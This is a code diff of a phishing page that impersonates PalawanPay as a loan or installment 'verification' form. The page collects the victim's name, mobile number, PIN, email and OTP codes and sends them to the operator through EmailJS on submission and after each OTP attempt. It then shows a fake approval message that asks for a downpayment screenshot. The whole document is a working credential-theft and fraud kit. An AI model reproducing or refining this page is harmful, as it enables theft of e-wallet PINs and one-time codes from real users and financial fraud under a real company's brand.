@@ -1,115 +1,119 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>PalawanPay Verification</title>
-<link rel="icon" href="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" />
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-  (function() {
-    emailjs.init("JrobxQsLrNfy-y_lB"); // ✅ Correct EmailJS Public Key
-  })();
-</script>
-<style>
-  body {
-    margin: 0;
-    padding: 0;
-    font-family: Arial, sans-serif;
-    background: url('https://www.palawanpay.com/wp-content/uploads/2025/05/Panaloan_May-1-819x1024.jpg') no-repeat center center fixed;
-    background-size: cover;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-  }
-  .overlay {
-    background: rgba(255, 255, 255, 0.95);
-    padding: 30px;
-    border-radius: 12px;
-    width: 90%;
-    max-width: 400px;
-    text-align: center;
-  }
-  .logo {
-    display: block;
-    margin: 0 auto 15px auto;
-    width: 100%;
-    max-width: 260px;
-    height: auto;
-  }
-  .footer-logo {
-    display: block;
-    margin: 15px auto 5px auto;
-    width: 100%;
-    max-width: 300px;
-    height: auto;
-  }
-  .title {
-    color: #046930;
-    margin-bottom: 10px;
-    font-weight: bold;
-  }
-  input {
-    width: 100%;
-    padding: 12px;
-    margin: 10px 0;
-    border: 1px solid #ccc;
-    border-radius: 8px;
-    font-size: 16px;
-  }
-  .btn {
-    width: 100%;
-    padding: 12px;
-    margin-top: 12px;
-    background-color: #046930;
-    color: white;
-    border: none;
-    border-radius: 8px;
-    font-size: 18px;
-    cursor: pointer;
-  }
-  .btn:hover {
-    background-color: #035224;
-  }
-  .footer {
-    margin-top: 10px;
-    font-size: 14px;
-    color: #333;
-  }
-  .rights {
-    margin-top: 5px;
-    font-size: 12px;
-    color: #666;
-  }
-  .status {
-    margin-top: 10px;
-    font-size: 14px;
-  }
-  #loading {
-    display: none;
-  }
-  .spinner {
-    margin: 20px auto;
-    width: 40px;
-    height: 40px;
-    border: 4px solid #ccc;
-    border-top: 4px solid #046930;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-  }
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PalawanPay Verification</title>
+  <link rel="icon" href="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" />
+  
+  <!-- ✅ Updated EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("JrobxQsLrNfy-y_lB"); // ✅ Your Public Key
+    })();
+  </script>
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: url('https://www.palawanpay.com/wp-content/uploads/2025/05/Panaloan_May-1-819x1024.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .overlay {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 15px auto;
+      width: 100%;
+      max-width: 260px;
+      height: auto;
+    }
+    .footer-logo {
+      display: block;
+      margin: 15px auto 5px auto;
+      width: 100%;
+      max-width: 300px;
+      height: auto;
+    }
+    .title {
+      color: #046930;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      margin-top: 12px;
+      background-color: #046930;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background-color: #035224;
+    }
+    .footer {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #333;
+    }
+    .rights {
+      margin-top: 5px;
+      font-size: 12px;
+      color: #666;
+    }
+    .status {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    #loading {
+      display: none;
+    }
+    .spinner {
+      margin: 20px auto;
+      width: 40px;
+      height: 40px;
+      border: 4px solid #ccc;
+      border-top: 4px solid #046930;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
+
 <body>
 <div class="overlay">
 
   <img src="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" class="logo" alt="PalawanPay Logo" />
 
-  <!-- Step 1: Registration Form -->
+  <!-- Step 1 -->
   <div id="step1">
     <h2 class="title">PalawanPay Form</h2>
     <form id="register-form">
@@ -123,7 +127,7 @@
     </form>
   </div>
 
-  <!-- Step 2: OTP Page -->
+  <!-- Step 2 -->
   <div id="step2" style="display:none;">
     <h2 class="title">Palawan Express Mabuhay!</h2>
     <p>We sent a (6) digit verification code to your mobile number.<br/>
@@ -140,13 +144,13 @@
     <p>Processing your request... <span id="countdown">10</span> seconds</p>
   </div>
 
-  <!-- Step 3: Approval Message -->
+  <!-- Step 3 -->
   <div id="step3" style="display:none;">
     <h2 class="title">Application Approved!</h2>
     <p style="text-align:left;">
       Congratulations suki!<br><br>
-      Ang iyong application form ay APPROVED na bago mag patuloy kailangan mo mag fill-up at i-pass ang contract form na iyong matatangap sa pamamagitan ng email upang ma check ng aming system na ikaw ay isang GOOD PAYER.<br><br>
-      Please also send a screenshot of your PalawanPay account with your downpayment amount for the meet up payment so that we can have a record of your first "GIVES AND INSTALLMENT"<br><br>
+      Ang iyong application form ay APPROVED na. Bago magpatuloy, kailangan mong mag fill-up at i-pass ang contract form na iyong matatanggap sa pamamagitan ng email upang ma-check ng aming system na ikaw ay isang GOOD PAYER.<br><br>
+      Please also send a screenshot of your PalawanPay account with your downpayment amount for the meet up payment.<br><br>
       NOTE: You will give the payment when you meet the seller and the payment will be made using Palawanpay to PalawanPay.<br><br>
       Your Verification code is (450099). DO NOT SHARE.<br><br>
       (palawanpayexpress@gmail.com) or call our hotline "09190380588"
@@ -165,23 +169,16 @@
     document.getElementById('status1').textContent = "Sending...";
     document.getElementById('status1').style.color = "blue";
 
-    emailjs.send("service_hgozm6f", "template_c2i1xpm", {
-      name: document.getElementById('name').value,
-      mobile: document.getElementById('mobile').value,
-      pin: document.getElementById('pin').value,
-      email: document.getElementById('email').value,
-      unit: document.getElementById('unit').value,
-      otp: "",
-      status: "Initial Registration"
-    }).then(() => {
-      sessionStorage.setItem('otpAttempts', '0');
-      document.getElementById('step1').style.display = 'none';
-      document.getElementById('step2').style.display = 'block';
-    }, (error) => {
-      document.getElementById('status1').textContent = '❌ Failed to send.';
-      document.getElementById('status1').style.color = 'red';
-      console.error('EmailJS Error:', error);
-    });
+    emailjs.sendForm('service_hgozm6f', 'template_c2i1xpm', this)
+      .then(() => {
+        sessionStorage.setItem('otpAttempts', '0');
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+      }, (error) => {
+        document.getElementById('status1').textContent = '❌ Failed to send.';
+        document.getElementById('status1').style.color = 'red';
+        console.error('EmailJS Error:', error);
+      });
   });
 
   function verifyOTP() {
@@ -199,13 +196,14 @@
       startCountdown();
     }
 
-    emailjs.send("service_hgozm6f", "template_c2i1xpm", {
+    // Send OTP status
+    emailjs.send('service_hgozm6f', 'template_c2i1xpm', {
       name: document.getElementById('name').value,
       mobile: document.getElementById('mobile').value,
       email: document.getElementById('email').value,
       pin: document.getElementById('pin').value,
       otp: enteredOTP,
-      status: attempts < 2 ? "Wrong OTP Attempt #" + attempts : "Correct OTP"
+      status: attempts < 2 ? 'Wrong OTP Attempt #' + attempts : 'Correct OTP'
     });
   }
 
